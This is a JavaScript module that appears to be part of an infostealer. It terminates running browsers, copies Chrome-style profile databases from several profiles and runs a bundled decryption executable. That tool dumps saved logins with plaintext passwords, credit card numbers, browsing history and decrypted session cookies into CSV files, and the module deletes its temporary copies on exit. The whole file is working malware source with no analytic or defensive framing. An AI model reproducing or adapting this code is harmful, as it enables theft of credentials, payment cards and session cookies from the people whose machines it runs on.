const { existsSync, copyFileSync, mkdirSync, rmSync } = require('fs');
const { join, sep, resolve } = require('path');
const { randomFileCreator } = require('../util/dir');
const { execSync, exec } = require('child_process');
const { tempFolder } = require('../index');
const { addDoubleQuotes } = require('../util/string');
const { sleep } = require('../util/general');
const { browsers, browsersProcesses } = require('../util/variables');

const filesToDelete = [];
const toolPath = addDoubleQuotes(join(tempFolder, 'decrypt_key.exe'));

/**
 * @param {string} name
 * @param {string} path
 * @param {string} use
 * @param {string} filename
 * @param {(dbFile: string, csvFile: string) => void} dbData
 * @param {string} [profile]
 */
const _ = (name, path, use, filename, dbData, profile = 'Default') => {
  path += join(sep, profile, use);
  if (!existsSync(path)) return;

  if (!existsSync(join(tempFolder, 'Browsers', name))) mkdirSync(join(tempFolder, 'Browsers', name));
  const file = join(tempFolder, 'Browsers', name, `${filename}.csv`);
  const dbFile = randomFileCreator();
  filesToDelete.push(dbFile);
  copyFileSync(path, dbFile);

  dbData(dbFile, file);
};

const passwords = (name, path, profile) => {
  return _(name, path, 'Login Data', 'Logins', (dbFile, csvFile) => exec(
    [
      toolPath, `--path "${path}"`, `--db-file "${dbFile}"`, '--sql "SELECT origin_url, username_value, password_value FROM logins"',
      `--csv-file "${csvFile}"`, '--rows "url,username,password"', '--decrypt-row 2'
    ].join(' ')
  ), profile);
};

const history = (name, path, profile) => {
  return _(name, path, 'History', 'History', (dbFile, csvFile) => exec(
    [
      toolPath, `--path "${path}"`, `--db-file "${dbFile}"`, '--sql "SELECT url, title, visit_count, typed_count FROM urls"',
      `--csv-file "${csvFile}"`, '--rows "url,title,visit count,typed count"'
    ].join(' ')
  ), profile);
};

const creditCards = (name, path, profile) => {
  return _(name, path, 'Web Data', 'Credit Cards', (dbFile, csvFile) => exec(
    [
      toolPath, `--path "${path}"`, `--db-file "${dbFile}"`,
      '--sql "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"',
      `--csv-file "${csvFile}"`, '--rows "name on card,expiration month,expiration year,card number"', '--decrypt-row 3'
    ].join(' ')
  ), profile);
};

const cookies = (name, path, profile) => {
  return _(name, path, join('Network', 'Cookies'), 'Cookies', (dbFile, csvFile) => exec(
    [
      toolPath, `--path "${path}"`, `--db-file "${dbFile}"`,
      '--sql "SELECT host_key, name, encrypted_value, path, is_secure, is_httponly, has_expires, is_persistent, samesite, source_port FROM cookies"',
      `--csv-file "${csvFile}"`, '--rows "host,name,value,path,is secure,is httponly,has expires,is persistent,samesite,port"',
      '--decrypt-row 2'
    ].join(' ')
  ), profile);
};

const fns = { passwords, history, creditCards, cookies };

const kill = (processes) => {
  return new Promise((resolve) => {
    const tasks = execSync('tasklist').toString().split('\n');
    let i = 0;
    processes.filter(task => tasks.includes(task)).forEach((task, index) => {
      exec(`taskkill /f /im ${task}.exe`).on('exit', () => i = index);
    });
    if (i >= tasks) resolve();
  });
};

if (!existsSync(join(tempFolder, 'Browsers'))) mkdirSync(join(tempFolder, 'Browsers'));
kill(browsersProcesses).then(() => {
  browsers.forEach(async (browser) => {
    const path = resolve(process.env.LOCALAPPDATA, browser.join(sep), 'User Data');
    if (existsSync(path)) {
      ['passwords', 'history', 'creditCards', 'cookies']
        .forEach(fn => {
          ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']
            .forEach(profile => {
              fns[fn](browser.join(' '), path, profile);
            });
        });
    }
  });
});

process.on('exit', () => {
  sleep(1000).then(() => filesToDelete.forEach(file => existsSync(file) && rmSync(file)));
});
